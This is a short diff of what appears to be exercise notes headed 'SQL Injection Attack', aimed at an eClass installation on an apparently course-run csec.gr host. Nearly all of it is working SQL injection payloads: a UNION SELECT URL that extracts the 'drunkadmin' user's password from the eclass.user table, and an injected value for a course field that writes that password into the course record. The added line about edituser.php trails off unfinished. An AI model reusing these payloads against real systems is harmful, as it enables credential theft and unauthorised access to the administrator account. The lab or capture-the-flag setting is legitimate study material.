@@ -22,8 +22,10 @@ SQL Injection Attack
 
     	- http://eponymous.csec.gr/modules/admin/newuseradmin.php?id=1%27%20and%201=2%20union%20select%20password,password,password,password,password,password,password,password%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--
 
-    	- Got to http://eponymous.csec.gr/modules/admin/infocours.php?c=TMA101 and set Ekpaideyths to: 
+    	- Go to http://eponymous.csec.gr/modules/admin/infocours.php?c=TMA101 and set Ekpaideyths to: 
     	lef',intitule=(select password from eclass.user where username="drunkadmin"), faculteid='1' WHERE code='TMA101' -- --
+
+    	- Go to http://eponymous.csec.gr/modules/admin/edituser.php?u=1 and set for SQL Injection
 
 	User Attack
 
